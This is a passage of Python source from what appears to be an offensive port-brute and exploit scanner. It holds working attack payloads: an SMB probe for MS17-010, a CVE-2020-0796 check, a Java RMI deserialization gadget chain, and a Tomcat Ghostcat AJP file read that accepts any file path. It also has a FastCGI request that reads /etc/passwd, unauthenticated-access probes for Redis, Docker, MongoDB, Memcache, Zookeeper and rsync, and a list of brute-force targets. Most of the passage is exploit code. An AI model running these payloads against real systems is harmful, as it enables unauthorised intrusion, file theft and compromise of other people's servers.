                            share += "\x5c\x5c" + self.url + "\x5c\x49\x50\x43\x24\x00"  # Path: \\ip_target\IPC$
                            share += "\x3f\x3f\x3f\x3f\x3f\x00"

                            da = struct.pack(">i", len(share)) + bytes(share)

                        ## PeekNamedPipe Request, FID: 0x0000
                        if data[8:10] == "\x75\x00":
                            smbpipefid0 = "\xff\x53\x4d\x42"  # Server Component: SMB
                            smbpipefid0 += "\x25"  # SMB Command: Trans (0x25)
                            smbpipefid0 += "\x00"  # Error Class: Success (0x00)
                            smbpipefid0 += "\x00"  # Reserved
                            smbpipefid0 += "\x00\x00"  # Error Code: No Error
                            smbpipefid0 += "\x18"  # Flags
                            smbpipefid0 += "\x01\x28"  # Flags 2
                            smbpipefid0 += "\x00\x00"  # Process ID High 0
                            smbpipefid0 += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
                            smbpipefid0 += "\x00\x00"  # Reserved
                            smbpipefid0 += data[28:34]  # TID+PID+UID
                            smbpipefid0 += "\x42\xc1"  # Multiplex ID 49474
                            smbpipefid0 += "\x10"  # Word Count (WCT): 16
                            smbpipefid0 += "\x00\x00"  # Total Parameter Count: 0
                            smbpipefid0 += "\x00\x00"  # Total Data Count: 0
                            smbpipefid0 += "\xff\xff"  # Max Parameter Count: 65535
                            smbpipefid0 += "\xff\xff"  # Max Data Count: 65535
                            smbpipefid0 += "\x00"  # Max Setup Count: 0
                            smbpipefid0 += "\x00"  # Reserved: 00
                            smbpipefid0 += "\x00\x00"  # Flags: 0x0000
                            smbpipefid0 += "\x00\x00\x00\x00"  # Timeout: Return immediately (0)
                            smbpipefid0 += "\x00\x00"  # Reserved: 0000
                            smbpipefid0 += "\x00\x00"  # Parameter Count: 0
                            smbpipefid0 += "\x4a\x00"  # Parameter Offset: 74
                            smbpipefid0 += "\x00\x00"  # Data Count: 0
                            smbpipefid0 += "\x4a\x00"  # Data Offset: 74
                            smbpipefid0 += "\x02"  # Setup Count: 2
                            smbpipefid0 += "\x00"  # Reserved: 00
                            smbpipefid0 += "\x23\x00"  # Function: PeekNamedPipe (0x0023)
                            smbpipefid0 += "\x00\x00"  # FID: 0x0000
                            smbpipefid0 += "\x07\x00"  # Byte Count (BCC): 7
                            smbpipefid0 += "\x5c\x50\x49\x50\x45\x5c\x00"  # Transaction Name: \PIPE\

                            da = struct.pack(">i", len(smbpipefid0)) + bytes(smbpipefid0)
                        s.send(da)
                except Exception as error:
                    return output.error_output(self.url+' '+str(error))
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()

    def smb_cve_2020_0796(self, port=445):
        import struct
        appName = 'PortBrute'
        pocname = 'smb_cve_2020_0796'
        method = 'socks'
        payload = b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET)
                s.settimeout(self.timeout)
                s.connect((self.url, port))
                s.send(payload)
                nb, = struct.unpack(">I", s.recv(4))
                data = s.recv(nb)
                if data[68:70] != b"\x11\x03" or data[70:72] != b"\x02\x00":
                    return output.fail()
                else:
                    return output.no_echo_success(method)
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()

    def rsync(self, port=873):
        appName = 'PortBrute'
        pocname = 'rsync'
        method = 'socks'
        payload = b"\x40\x52\x53\x59\x4e\x43\x44\x3a\x20\x33\x31\x2e\x30\x0a"
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect_ex((self.url, port))
                s.sendall(payload)
                data = s.recv(400)
                if b"RSYNCD" in data:
                    s.sendall(b"\x0a")
                modulelist = s.recv(200)
                if len(modulelist) > 0:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()
            
    def rmi(self, port=1099):
        import binascii,time
        appName = 'PortBrute'
        pocname = 'rmi'
        method = 'socks'
        first_send = "4a524d4900024b"
        second_send = "000c31302e3131302e32382e313300000000"
        third_send ="50aced00057722000000000000000000000000000000000000000000000000000044154dc9d4e63bdf74000570776e656473" \
                    "7d00000001000f6a6176612e726d692e52656d6f746570787200176a6176612e6c616e672e7265666c6563742e50726f7879" \
                    "e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e" \
                    "646c65723b7078707372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f63" \
                    "6174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f757469" \
                    "6c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b707870737200316f72672e617061636865" \
                    "2e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e5472616e73666f726d65644d617061773fe05df15a70030002" \
                    "4c000e6b65795472616e73666f726d657274002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6" \
                    "e732f5472616e73666f726d65723b4c001076616c75655472616e73666f726d657271007e000a707870707372003a6f72672" \
                    "e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666" \
                    "f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6" \
                    "d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b7078707572002d5b4c6f72672e6170616368652e6" \
                    "36f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d8341899020000707870000000067" \
                    "372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616" \
                    "e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4" \
                    "f626a6563743b707870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000070787" \
                    "07372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b6" \
                    "5725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6" \
                    "563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797" \
                    "065737400125b4c6a6176612f6c616e672f436c6173733b707870757200135b4c6a6176612e6c616e672e4f626a6563743b9" \
                    "0ce589f1073296c02000070787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a9902000" \
                    "0707870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd02000070787074000e676574436f6e7" \
                    "374727563746f727571007e001d000000017671007e001d7371007e00167571007e001b000000017571007e001b000000017" \
                    "571007e001f000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f646549000" \
                    "4706f72744c0009617574686f7269747971007e00184c000466696c6571007e00184c0004686f737471007e00184c0008707" \
                    "26f746f636f6c71007e00184c000372656671007e0018707870ffffffffffffffff707400052f746d702f740000740004666" \
                    "96c65707874000b6e6577496e7374616e63657571007e001d000000017671007e001b7371007e00167571007e001b00000001" \
                    "74000d4572726f7242617365457865637400096c6f6164436c6173737571007e001d00000001767200106a6176612e6c616e6" \
                    "72e537472696e67a0f0a4387a3bb3420200007078707371007e00167571007e001b00000002740007646f5f6578656375710" \
                    "07e001d000000017100"

        forth_send = "7e00367400096765744d6574686f647571007e001d0000000271007e003671007e00237371007e00167571007e001b00000" \
                    "00270757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007078700000000174000677686f" \
                    "616d69740006696e766f6b657571007e001d00000002767200106a6176612e6c616e672e4f626a656374000000000000000" \
                    "000000070787071007e002f737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f61" \
                    "64466163746f724900097468726573686f6c647078703f4000000000000c7708000000100000000174000576616c7565710" \
                    "07e004878787672001b6a6176612e6c616e672e616e6e6f746174696f6e2e5461726765740000000000000000000000707870"

        first_send = binascii.a2b_hex(first_send)
        second_send = binascii.a2b_hex(second_send)
        third_send = binascii.a2b_hex(third_send)
        forth_send = binascii.a2b_hex(forth_send)
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect_ex((self.url, port))
                s.send(first_send)
                s.recv(1024)
                time.sleep(0.5)
                s.send(second_send)
                s.send(third_send)
                s.send(forth_send)
                data = s.recv(20480)
                time.sleep(0.5)
                if "8888" in data:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()

    def zookeeper(self, port=2181):
        appName = 'PortBrute'
        pocname = 'zookeeper'
        method = 'socks'
        payload = 'success'
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect_ex((self.url, port))
                s.send(payload.encode())
                data = s.recv(1024)
                if b'Environment' in data:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()

    def docker(self, port=2375):
        appName = 'PortBrute'
        pocname = 'docker'
        method = 'socks'
        payload = "GET /containers/json HTTP/1.1\r\nHost: %s:%s\r\n\r\n" % (self.url, port)
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect_ex((self.url, port))
                s.send(payload.encode())
                data = s.recv(1024)
                if b"HTTP/1.1 200 OK" in data and b'Docker' in data and b'Api-Version' in data:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()

    def redis(self, port=6379):
        appName = 'PortBrute'
        pocname = 'redis'
        method = 'socks'
        payload = b'\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect_ex((self.url, port))
                s.send(payload)
                data = s.recv(1024)
                if b"redis_version" in data:
                    return output.echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()

    def ajp_cve_2020_1938(self, port=8009):
        from ajpy.ajp import AjpForwardRequest
        appName = 'PortBrute'
        pocname = 'ajp_cve_2020_1938'
        method = "ajp"
        headers = {'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'}
        #输出类
        output = Output(self.url, appName, pocname)

        default_port = port
        default_requri = '/'
        default_headers = {}
        username = None
        password = None
        hostname = self.url
        request = "null"
        rawdata = ">_< Tomcat cve-2020-2019 vulnerability uses AJP protocol detection\n" 
        rawdata += ">_< So there is no HTTP protocol request and response"
        if self.vuln != 'False':
            default_file = self.cmd
        else:
            default_file = "WEB-INF/web.xml"
        info = "[file contains]"+" [port:"+str(default_port)+" file:"+default_file+"]"
        try:
            socket.setdefaulttimeout(self.timeout)
            Mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            Mysocket.connect((hostname, default_port))
            Mystream = Mysocket.makefile("rb", buffering=0) #PY2: bufsize=0
            attributes = [
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', default_file]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
            ]
            method = 'GET'
            forward_request = prepare_ajp_forward_request(hostname, default_requri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
            if username is not None and password is not None:
                forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic "+ str(("%s:%s" %(username, password)).encode('base64').replace("\n" ""))
            for h in default_headers:
                forward_request.request_headers[h] = headers[h]
            for a in attributes:
                forward_request.attributes.append(a)
            responses = forward_request.send_and_receive(Mysocket, Mystream)
            if len(responses) == 0:
                return None, None
            snd_hdrs_res = responses[0]
            data_res = responses[1:-1]
            request = (b"".join([d.data for d in data_res]).decode())
            #print ((b"".join([d.data for d in self.data_res]).decode()))
            #return self.snd_hdrs_res, self.data_res
            #print (self.request)
            if self.vuln != 'False':
                print(request)
                return
            if 'xml' in request:
                return output.echo_success(method, info)
            else:
                return output.fail()
        except socket.timeout as error:
            return output.timeout_output()
        except NotImplementedError:
            return output.error_output('NotImplementedError')
        except Exception as error:
            return output.error_output(str(error))

    def fastcgi(self, port=9000):
        appName = 'PortBrute'
        pocname = 'fastcgi'
        method = 'socks'
        payload_raw = """
        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
        """
        payload = ''
        for _ in payload_raw.split():
            payload += chr(int(_, 16))
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((self.url, port))
                s.send(payload)
                data = s.recv(1024)
                if data.find(':root:') > 0:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()

    def memcache(self, port=11211):
        appName = 'PortBrute'
        pocname = 'memcache'
        method = 'socks'
        # command:stats
        payload = b'\x73\x74\x61\x74\x73\x0a'
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((self.url, port))
                s.send(payload)
                data = s.recv(2048)
                if data and (b'STAT version' in data):
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()
  
    def mongodb(self, port=27017):
        import pymongo
        appName = 'PortBrute'
        pocname = 'mongodb'
        method = 'socks'
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = pymongo.MongoClient(
                    host=self.url, 
                    port=port, 
                    connectTimeoutMS=self.timeout*1000,
                    socketTimeoutMS=self.timeout*1000,
                    serverSelectionTimeoutMS=self.timeout*1000,
                )
                database_list = s.database_names()
                if database_list:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()
            
    def _all(self, pool, thread_list):
        appName = 'PortBrute'
        pocname = '_all'
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                scan = ScanPort(self.url)
                result = scan.pool()
                if len(result) != 0 and len(result) < 30:
                    now = datetime.datetime.now()
                    color("["+str(now)[11:19]+"] " + "[+] The " + self.url + " is "+ self.pocname +" ["+ "OpenPort" +"] "+ ', '.join(result), 'green')
                    for hosts in result:
                        server = hosts.split(':')[0]
                        port = int(hosts.split(':')[1])
                        if server == 'HTTPS' or server == 'HTTP':
                            #getattr(self, 'http_or_https_get_title')(port, server)
                            thread_list.append(pool.submit(getattr(self, 'http_or_https_get_title'), port, server))
                        else:
                            for func in dir(PortBrute):
                                if re.search(server, func, re.I) is not None:
                                    #getattr(self, func)(port)
                                    thread_list.append(pool.submit(getattr(self, func), port))
                return thread_list
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Info']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Info'] = 'l'
tb.add_row([
    'FTP',
    'FTP Brute',
    '21'
])
tb.add_row([
    'SSH',
    'SSH Brute',
    '22'
])
tb.add_row([
    'Telnet',
    'Telnet Brute',
    '23'
])
tb.add_row([
    'Mssql',
    'Mssql Brute',
    '1433'
])
tb.add_row([
    'MySQL',
    'MySQL Brute',
    '3306'
])
tb.add_row([
    'PostgreSql',
    'PostgreSQL Brute',
    '5432'
])
tb.add_row([
    'SMB',
    'smb_MS17010',
    '445'
])
tb.add_row([
    'SMB',
    'smb_cve_2020_0796',
    '445'
])
tb.add_row([
    'Rsync',
    'Rsync Unauthorized Access',
    '873'
])
tb.add_row([
    'Rmi',
    'Rmi Deserialized',
    '1099'
])
tb.add_row([
    'Zookeeper',
    'Zookeeper Unauthorized access',
    '2181'
])
tb.add_row([
    'Docker',
    'Docker unauthorized success',
    '2375'
])
tb.add_row([
    'Redis',
    'Redis Unauthorized Access',
    '6379'
])
tb.add_row([
    'Ajp',
    'Apache Tomcat CVE_2020_1938',
    '8009'
])
tb.add_row([
    'Fastcgi',
    'Fastcgi Remote Code Execution Vulnerability',
    '9000'
])
tb.add_row([
    'Memcache',
    'Memcache Unauthorized Access',
    '11211'
])
tb.add_row([
    'MongoDB',
    'MongoDB Unauthorized Access',
    '27017'
])
print(tb)
def check(**kwargs):
    thread_list = []
    ExpPortBrute = PortBrute(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpPortBrute, kwargs['pocname'])))
    #调用所有函数
    else:
        thread_list = getattr(ExpPortBrute, '_all')(kwargs['pool'], thread_list)
        # thread_list.append(kwargs['pool'].submit(getattr(ExpPortBrute, '_all')))
        # for func in dir(PortBrute):
        #     if not func.startswith("__"):
        #         thread_list.append(kwargs['pool'].submit(getattr(ExpPortBrute, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)